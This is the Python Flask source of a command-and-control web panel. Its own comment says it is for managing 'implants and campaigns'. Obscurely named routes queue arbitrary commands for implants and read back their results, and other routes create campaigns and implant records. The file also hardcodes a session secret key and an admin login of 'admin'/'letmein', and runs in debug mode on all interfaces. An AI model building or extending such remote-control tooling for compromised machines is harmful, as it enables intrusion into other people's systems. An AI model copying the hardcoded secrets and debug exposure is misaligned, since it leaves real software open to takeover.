from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, session
from flask_sqlalchemy import SQLAlchemy
import base64
from Implant import ImplantSingleton
from flask_login import LoginManager, login_required, current_user, login_user, logout_user
from Database import Database
#from wtforms import Form, TextField, TextAreaField, validators, StringField, SubmitField
# This is the web app to control implants and campaigns

db = Database()
Imp=ImplantSingleton.instance


app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
login = LoginManager(app)
login.init_app(app)
# -- Context Processors --#
@app.context_processor
def inject_dict_for_all_auth_templates():
    # -- Returns the list of Campaigns the auth'd user has read access to --#
    #print(dir(current_user),current_user.is_authenticated)
    if current_user.is_authenticated:
        #print(current_user)
        # Return the list of the users available campaigns for the navbar dropdown.
        return dict(campaignlist=db.Get_AllUserCampaigns(current_user.user_email))
    else:
        return dict()
    # return dict(mydict=code_to_generate_dict())

@app.context_processor
def inject_dict_for_all_campaign_templates(cid=None):
    #print(request.url)
    if 'cid' in g:
        #print("We gots' a CID BOIS!")
        cid =g.get('cid')
        cname=db.Get_CampaignNameFromCID(cid)
    if cid != None:
        return dict(campaign=cname)
    else:
        print("context processor")
        return dict()


# -- Managing the error and user object. --#
@login.user_loader
def load_user(id):
    return db.Get_UserObject(id)
@app.before_request
def before_request():
    #print(request)
    return
@app.after_request
def add_header(r):
    return r
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('BaseHomePage'),404) # This should be a proper 404?
@app.errorhandler(401)
def page_not_found(e):
    return redirect(url_for(('login')), 401)

# -- AUTHENTICATION --#
def AUTO_LOGIN_REMOVE():
    a = db.Get_UserObjectLogin("admin","letmein")
    # a.authenticated=True
    #print("###",type(a),a)
    #print(a.is_authenticated())
    login_user(a)
    #print("::", a.is_authenticated())
@app.route("/login", methods=['GET','POST'])
def login():
    #AUTO_LOGIN_REMOVE()
    if request.method=="POST":
        print("POST /login")
        if 'email' in request.form and 'password' in request.form and request.form['email'] != None and request.form['password'] != None:
            print("a",type(request.form['email']),type(request.form['password']))

            a = db.Get_UserObjectLogin(request.form['email'],request.form['password'])
            print(type(a),a)
            if a == False:
                return render_template("login.html", error="Incorrect Username/Password")
            #a.authenticated=True
            print(a.is_authenticated())
            login_user(a)
            print("::",a.is_authenticated())
            return redirect(url_for("BaseHomePage"))
    print("GET /login")
    return render_template("login.html")

@app.route("/logout")
@login_required
def logout():
    #print(current_user.uid, current_user.user_email)
    if (current_user.is_authenticated):
        logout_user()
        return redirect(url_for("login"))
    else:
        return redirect(url_for("login"))

# -- PURGE --#
# -- PURGE --#

@app.route("/abc", methods =['GET','POST'])
@login_required
def management():
    return render_template('main.html')

@app.route("/aab", methods =['GET','POST'])
@login_required
def cmdreturn():
    #print( Imp.Get_CommandResult())
    return str(Imp.Get_CommandResult())
#Endpoint query

@app.route("/aaa/<cmd>", methods =['GET','POST'])
@app.route("/aaa", methods =['GET','POST'])
@login_required
def aaa(cmd=0):
    if request.method=="GET":
        Imp.AddCommand(cmd)
        return "a"
    else:
        Imp.AddCommand(request.form['ta'])
        return "OK."
# -- END PURGE --#
# -- END PURGE --#

# -- NEW ENDPOINTS -- #

@app.route("/")
@login_required
def BaseHomePage():
    a = db.Get_AllUserCampaigns(current_user.user_email)
    return render_template("welcome.html")


@app.route("/<cid>/")
@login_required
def BaseImplantPage(cid):
    g.setdefault('cid', cid)
    # -- This needs to return the implant_input.html template if any implants exist, if not reuturn ImplantMain
    # --    also need to work out the CID across the pages...
    Implants = db.Get_AllCampaignImplants(cid)
    #print(Implants[0][0],type(Implants),dir(Implants))
    if len(Implants) >0:
        #   print(Implants, dir(Implants))
        print(url_for('ImplantInputPage',cid=cid,iid=Implants[0][1]))
        return redirect(url_for('ImplantInputPage',cid=cid,iid=Implants[0][1]))
    return render_template("ImplantMain.html",cid=cid, Msg="There are no implants associated with this campaign")
@app.route("/<cid>/<iid>")
@login_required
def ImplantInputPage(cid,iid):
    print(cid,iid)
    return render_template("implant_input.html")

@login_required
@app.route ("/<cid>/settings")
def BaseImplantSettings(cid):
    return "2"



@app.route("/CreateCampaign", methods=['GET','POST'])
@login_required
def CreateNewItem():
    if request.method=="POST":
        if 'CreateCampaign' in request.form:
            print("Building Campaign")
            print(request.form)
            #print(dir())
            # WOrk out if Implant or Campaign
            db.Create_Campaign(request.form['title'],current_user.user_email,request.form['description'])
            return redirect(url_for('BaseHomePage'))
        elif 'CreateImplant' in request.form:
            cid = request.form['CreateImplant']
            title = request.form['description']
            url = request.form['url']

    else:
        return render_template('CreateCampaign.html')

@app.route("/<cid>/implant/create", methods=['GET','POST'])
@login_required
def NewImplant(cid):
    #current_app['cid']=cid
    # -- set SID and user DB to convert --#
    g.setdefault('cid',cid)
    #g['cid']=cid
    if request.method=="POST":
        try:
            if "CreateImplant" in request.form:

                title = request.form['title']
                url=request.form['url']
                description= request.form['description']

                print("NOW CREATING IMPLANT")
                a = db.Add_Implant(cid,title,url,description)
        except Exception as e:
            print("NewImplant: ",e)
            # -- Implicting returning page with Error --#
            return render_template('CreateImplant.html', cid=cid, error="There was an error creating your implant.")

    print("Create Form: ",request.form)
    return render_template('CreateImplant.html', cid=cid)

@app.route("/Implant/<iid>/Generate", methods=["GET"])
@login_required
def ImplantGenerate(iid):
    return "405"

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
    print ("App running")